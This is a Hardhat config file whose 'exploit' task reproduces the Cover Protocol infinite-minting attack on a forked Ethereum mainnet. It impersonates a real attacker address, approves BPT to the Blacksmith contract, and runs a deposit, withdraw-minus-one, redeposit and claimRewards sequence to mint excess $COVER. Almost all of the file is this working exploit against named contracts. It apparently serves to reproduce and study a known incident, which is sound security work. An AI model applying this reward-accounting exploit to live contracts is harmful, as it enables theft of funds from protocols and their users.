/**
 * @type import('hardhat/config').HardhatUserConfig
 */
require("@nomiclabs/hardhat-ethers");
const { utils } = require("ethers");

const blacksmithABI = require("./abi/Blacksmith.json");
const coverABI = require("./abi/Cover.json");
const erc20ABI = require("./abi/ERC20.json");

if (!process.env.PROVIDER_URL) {
  console.log("Set PROVIDER_URL in env");
  process.exit();
}

task("exploit", async (taskArguments, hre) => {
  /*
    Cover Protocol infinite minting exploit
  */

  const attacker = "0xf05ca010d0bd620cc7c8e96e00855dde2c2943df"

  const blacksmith = await ethers.getContractAt(
    blacksmithABI,
    "0xe0b94a7bb45dd905c79bb1992c9879f40f1caed5"
  );
  const cover = await ethers.getContractAt(
    coverABI,
    "0x5d8d9f5b96f4438195be9b99eee6118ed4304286"
  );
  const bpt = await ethers.getContractAt(
    erc20ABI,
    "0xce0e9e7a1163badb7ee79cfe96b5148e178cab73"
  );

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [attacker],
  });
  const attackerSigner = await ethers.provider.getSigner(attacker);

  const amount = await bpt.balanceOf(attacker);
  const coverBalanceBefore = await cover.balanceOf(attacker);
  console.log(` ⦿ Attacker $COVER balanceOf ${coverBalanceBefore}`);
  await bpt
    .connect(attackerSigner)
    .approve(blacksmith.address, ethers.constants.MaxUint256);
  console.log(` ⦿ Depositing ${amount} BPT`);
  await blacksmith.connect(attackerSigner).deposit(bpt.address, amount);
  console.log(` ⦿ Withdrawing ${amount.sub(1)} BPT`);
  await blacksmith.connect(attackerSigner).withdraw(bpt.address, amount.sub(1));
  console.log(` ⦿ Depositing ${amount.sub(1)} BPT`);
  await blacksmith.connect(attackerSigner).deposit(bpt.address, amount.sub(1));
  console.log(" ⦿ Claiming rewards");
  await blacksmith.connect(attackerSigner).claimRewards(bpt.address);
  const coverBalanceAfter = await cover.balanceOf(attacker);
  console.log(` ⦿ Attacker $COVER balanceOf ${coverBalanceAfter}`);
  console.log(` ⦿ $COVER gain ${coverBalanceAfter.sub(coverBalanceBefore)}`);
});

module.exports = {
  solidity: "0.5.11",
  networks: {
    hardhat: {
      forking: {
        url: process.env.PROVIDER_URL, 
        blockNumber: 11541195
      },
    },
  }
};
